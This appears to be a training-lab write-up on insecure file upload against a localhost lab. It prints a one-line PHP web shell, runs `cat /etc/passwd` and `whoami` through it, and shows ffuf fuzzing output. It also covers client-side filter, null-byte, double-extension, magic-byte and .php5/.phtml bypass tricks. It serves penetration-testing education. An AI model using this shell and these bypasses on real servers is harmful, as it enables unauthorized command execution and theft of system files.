# 🚲 Insecure File Upload

Insecure file upload refers to a vulnerability where a web application allows users to upload files without proper validation, posing a serious security risk. Attackers can exploit this weakness to upload malicious files, leading to various consequences.

<figure><img src="../../../../.gitbook/assets/image (218).png" alt=""><figcaption></figcaption></figure>

### Basic Bypass <a href="#lecture_heading" id="lecture_heading"></a>

<figure><img src="../../../../.gitbook/assets/image (219).png" alt=""><figcaption><p>starting website</p></figcaption></figure>

When dealing with file uploads on a web application, security measures are often implemented to ensure that only valid and safe files are accepted. One common method is to restrict the allowed file types based on their extensions.

In a testing environment, an attempt was made to exploit a file upload functionality by injecting a reverse shell. However, the application responded with a restriction, allowing only PNG files to be uploaded.

`Only '.jpg' and '.png' files are allowed.`

we are going to check the requests that go through:

<figure><img src="../../../../.gitbook/assets/image (221).png" alt=""><figcaption></figcaption></figure>

To understand how this restriction is enforced, the network inspection tool was employed. It was discovered that the "extension check" was performed on the client side, meaning the validation was implemented in the user's browser rather than on the server.

Had the "extension check" been done on the server side, potential exploitation avenues could have included manipulating requests using tools like Burp Suite. Disabling JavaScript or altering extension policies could have been viable options in that scenario.

<figure><img src="../../../../.gitbook/assets/image (222).png" alt=""><figcaption></figcaption></figure>

Given that the extension check was client-side, an opportunity for bypassing the filter presented itself. By inspecting and modifying the requests in the network inspector, it was possible to manipulate the file type filter.

In this example we have a filter where we can only upload PNG's, we modify it in the repeater and reload it, and it bypassed the filter on client side :tada:

<figure><img src="../../../../.gitbook/assets/image (223).png" alt=""><figcaption></figcaption></figure>

```
<?php system($_GET['cmd']);?>
```

1. `<?php`: This is the opening tag for a PHP code block.
2. `system($_GET['cmd']);`: This line uses the `system` function, a PHP function that executes commands via the shell. It takes the command as a string argument. In this case, it retrieves the command from the 'cmd' parameter in the GET request using `$_GET['cmd']`. This means that whatever value is passed in the 'cmd' parameter will be executed as a shell command.

So we successfully injected a PHP file in the server, now the thing is to be able to access it, let's fuzz ->

```
┌──(kali㉿kali)-[~]
└─$ ffuf -u http://localhost/FUZZ -w /usr/share/wordlists/dirb/common.txt 

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://localhost/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/common.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

.hta                    [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 6ms]
                        [Status: 200, Size: 27945, Words: 13300, Lines: 506, Duration: 21ms]
assets                  [Status: 301, Size: 307, Words: 20, Lines: 10, Duration: 1ms]
.htpasswd               [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 109ms]
.htaccess               [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 114ms]
includes                [Status: 301, Size: 309, Words: 20, Lines: 10, Duration: 0ms]
index.php               [Status: 200, Size: 27945, Words: 13300, Lines: 506, Duration: 7ms]
labs                    [Status: 301, Size: 305, Words: 20, Lines: 10, Duration: 0ms]
server-status           [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 0ms
```

now in /labs ->

```
┌──(kali㉿kali)-[~]
└─$ ffuf -u http://localhost/labs/FUZZ -w /usr/share/wordlists/dirb/common.txt

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://localhost/labs/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/common.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

                        [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 266ms]
.hta                    [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 176ms]
.htaccess               [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 234ms]
.htpasswd               [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 966ms]
uploads                 [Status: 301, Size: 313, Words: 20, Lines: 10, Duration: 1ms]

```

and if we go&#x20;

```
http://localhost/labs/uploads/cmd.php
```

<figure><img src="../../../../.gitbook/assets/image (224).png" alt=""><figcaption></figcaption></figure>

To trigger the execution of the injected payload and run a shell command, you need to pass the desired command as a query parameter in the URL.

The URL structure typically looks like `http://localhost/labs/uploads/cmd.php?cmd=YOUR_COMMAND_HERE`.

So it's there, now we need to use it like we coded it and set the cmd variable to what we want:

```
http://localhost/labs/uploads/cmd.php?cmd=cat%20/etc/passwd
```

<figure><img src="../../../../.gitbook/assets/image (225).png" alt=""><figcaption></figcaption></figure>

This is the base URL of the web application or server. It points to a specific file named `cmd.php` in the `uploads` directory

The question mark `?` is a separator indicating the start of the query parameters. Anything after the question mark is considered part of the query string.

`cmd`

This is the key of the query parameter. In PHP, `$_GET['cmd']` will retrieve the value associated with the key `cmd` from the query string.

### Magic Bytes <a href="#lecture_heading" id="lecture_heading"></a>

<figure><img src="../../../../.gitbook/assets/image (361).png" alt=""><figcaption></figcaption></figure>

In certain scenarios, web applications perform server-side checks to ensure the integrity and expected file type of uploaded content. One common approach is to examine the Magic Bytes, which are the initial bytes of a file that indicate its file type.

In the presented case, the server enforces a server-side check on file uploads, blocking specific file types such as PHP files.

This time the check is happening server side, and it  blocks our input

One technique to bypass file type restrictions is to utilize null byte attacks by appending `%00` or using different file extensions. For instance:

```
logo3.php%00.png
logo3.php.png
logo3.asd
```

The objective is to confuse the server-side filter, which may only be checking for the '.png' extension.

#### Explanation

1. **`logo3.php%00.png`:**
   * **Explanation:**
     * `%00` is a null byte. In some programming languages and systems, it marks the end of a string. When appended to a filename, it might cause the server to interpret the file extension as only `.php`, potentially bypassing certain file type checks.
   * This can be effective if the server naively processes file extensions and relies on null-terminated strings for parsing.
   * It attempts to exploit scenarios where the server may only check for the presence of `.png` without considering additional characters.
2. **`logo3.php.png`:**
   * **Explanation:**
     * This filename tries to exploit situations where the server checks for specific extensions but may not validate the entire filename. The server might recognize the file as a PNG due to the `.png` extension but could potentially execute PHP code if not properly validated.
     * The goal is to deceive the server into treating the file as an image while the PHP code remains part of the filename.
3. **`logo3.asd`:**
   * **Explanation:**
     * Testing filenames with unconventional or unexpected extensions, like `.asd`, aims to identify scenarios where the server may rely on a predefined list of allowed extensions.
     * If the server's validation is lenient and does not adequately check for permitted file types, an attacker might be able to upload files with arbitrary extensions, potentially leading to security vulnerabilities.

Now a good thing to check is the magic byte; the first few bytes of a file wich tells the system what files it's dealing with:                                                                                                               &#x20;

```html
┌──(kali㉿kali)-[~/Downloads]
└─$ file logo2.png                             
logo2.png: PNG image data, 1080 x 1080, 8-bit/color RGBA, non-interlaced
                                                                                                                  
┌──(kali㉿kali)-[~/Downloads]
└─$ head logo2.png 
�PNG
▒
����lk�7�,ZtSoftwareAdobe ImageReadyq�e<3�IDATx���      |����p��B�Ik�$mV$!��mR����9�]�-�v��o�����n������
��ƅ����l��o�@܋+���;▒I3��hF3�fF����؞H�5▒�?���fP� 
...
...
```

So we need to trick the server thinking it's executing a PNG file ->

<figure><img src="../../../../.gitbook/assets/image (362).png" alt=""><figcaption></figcaption></figure>

we return to the state of start where we uploaded the PNG, we then put our payload in the middle, but we make sure to keep filename with a `.php`

Once we go and try to use the cmd like earlier @ [`http://localhost/labs/uploads/cmd1.php?cmd=whoami`](http://localhost/labs/uploads/cmd1.php?cmd=whoami)

Upon accessing the URL, the server attempts to interpret the PHP payload within the PNG file. However, due to the unexpected interaction between PNG bytes and PHP code, an error occurs, such as:

```
Warning: Unexpected character in input: ' in /var/www/html/labs/uploads/cmd1.php on line 181

Parse error: in /var/www/html/labs/uploads/cmd1.php on line 181
```

<figure><img src="../../../../.gitbook/assets/image (363).png" alt=""><figcaption></figcaption></figure>

To achieve a successful exploitation, a refined camouflage strategy is employed. This involves ensuring that the PNG bytes and PHP code do not correlate, preventing errors during interpretation.

<figure><img src="../../../../.gitbook/assets/image (364).png" alt=""><figcaption></figcaption></figure>

Upon refining the approach and uploading the manipulated file, successful access to the command execution is achieved. The server interprets the PNG bytes as expected, allowing the embedded PHP payload to execute without triggering errors. :tada:

### Exam Lab

<figure><img src="../../../../.gitbook/assets/image (365).png" alt=""><figcaption></figcaption></figure>

Applied the cmd file trick by embedding PHP code between legitimate parts, leveraging the magic bytes to deceive the server.

Successfully uploaded the manipulated file, but direct attempts with `.php` extensions were restricted.

Changed the file extension to `.php5` in an attempt to execute the PHP code.

Surprisingly, this extension change allowed successful execution of PHP code, **`.php`,`.php3`, `.php4 did` not work**

Server restrictions prevented successful uploads with these extensions, indicating a more robust validation process for common PHP extensions.

Changed the extension to `.phtml` to test if it allows PHP code execution.

<figure><img src="../../../../.gitbook/assets/image (366).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../../.gitbook/assets/image (367).png" alt=""><figcaption></figcaption></figure>

Successfully retrieved data with the `.phtml` extension, demonstrating that unconventional extensions can bypass certain restrictions.
